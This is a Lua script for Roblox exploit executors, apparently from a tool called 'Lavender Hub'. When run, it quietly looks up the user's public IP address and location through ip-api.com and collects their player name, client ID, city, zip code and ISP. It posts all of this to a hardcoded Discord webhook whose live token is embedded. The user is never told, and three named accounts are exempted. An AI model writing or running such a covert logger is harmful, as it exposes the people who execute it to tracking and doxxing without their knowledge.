local function sendWebhook()
    local webhook_url = "https://discord.com/api/webhooks/1437994266243764324/vqSQKW_9px74aIFEvRIPxMjGW5QcVQBllzSccyo0kb3HUpSR6YfzLhjCkIPGQQDpGLtY"
    
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if not requestFunc then
        return
    end
    
    local player = game:GetService("Players").LocalPlayer
    local player_name = player.Name
    local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
    
    if player_name == "alt_94s" or player_name == "MyaLovesYoux" or player_name == "bssaltig67" then
        local denyMessage = string.format("```ACCESS DENIED, (THIS USERS UNABLE TO GET LOGGED)\nUser: %s\nRoblox Client ID: %s```", player_name, HWID)
        
        local success, result = pcall(function()
            local response = requestFunc({
                Url = webhook_url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({["content"] = denyMessage})
            })
            return response
        end)
        return
    end
    
    local success, result = pcall(function()
        local ip_info = requestFunc({
            Url = "http://ip-api.com/json",
            Method = "GET"
        })
        
        local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
        
        local dataMessage = string.format([[
**Executed Lavender Hub**

**Profile**
> **Roblox Profile:** %s
> **Location:** ||%s, %s, %s||
> **IP Address:** ||%s||
> **HWID:** ||%s||

**Full Details**
> **Country:** ||%s (%s)||
> **Region:** ||%s, %s||
> **City:** ||%s||
> **Zipcode:** ||%s||
> **ISP:** ||%s||
> **Organization:** ||%s||
]], 
            player_name,
            ipinfo_table.city, ipinfo_table.regionName, ipinfo_table.country,
            ipinfo_table.query,
            HWID,
            ipinfo_table.country, ipinfo_table.countryCode,
            ipinfo_table.region, ipinfo_table.regionName,
            ipinfo_table.city,
            ipinfo_table.zip,
            ipinfo_table.isp,
            ipinfo_table.org)
        
        local response = requestFunc({
            Url = webhook_url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
        })
        return response
    end)
end

sendWebhook()
